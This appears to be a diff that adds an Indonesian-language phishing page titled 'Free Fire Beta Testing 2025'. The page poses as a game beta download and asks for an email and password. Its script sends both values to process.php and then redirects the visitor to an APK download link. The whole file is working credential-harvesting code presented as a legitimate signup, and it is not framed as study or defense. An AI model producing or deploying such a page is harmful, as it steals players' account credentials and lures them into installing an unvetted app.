@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Beta Testing 2025</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: url('https://wallpaperaccess.com/full/3302442.jpg') no-repeat center center/cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            color: white;
+            width: 350px;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.3);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: linear-gradient(45deg, #ff6600, #ff0000);
+            transform: scale(1.05);
+        }
+
+        .loading {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Free Fire Beta Testing</h2>
+        <p>Masukkan email dan password untuk mengunduh.</p>
+        <form id="registerForm">
+            <input type="email" id="email" placeholder="Email" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <button type="submit">Download Sekarang</button>
+            <p class="loading">🔄 Memproses pendaftaran...</p>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("registerForm").addEventListener("submit", function(event) {
+            event.preventDefault(); 
+
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            var loadingText = document.querySelector(".loading");
+
+            if (email && password) {
+                loadingText.style.display = "block"; // Tampilkan teks loading
+
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "process.php", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        setTimeout(function () {
+                            window.location.href = "https://example.com/freefire.apk"; // Ganti dengan link APK asli
+                        }, 2000);
+                    }
+                };
+                xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+            } else {
+                alert("Harap isi semua kolom!");
+            }
+        });
+    </script>
+
+</body>
+</html>
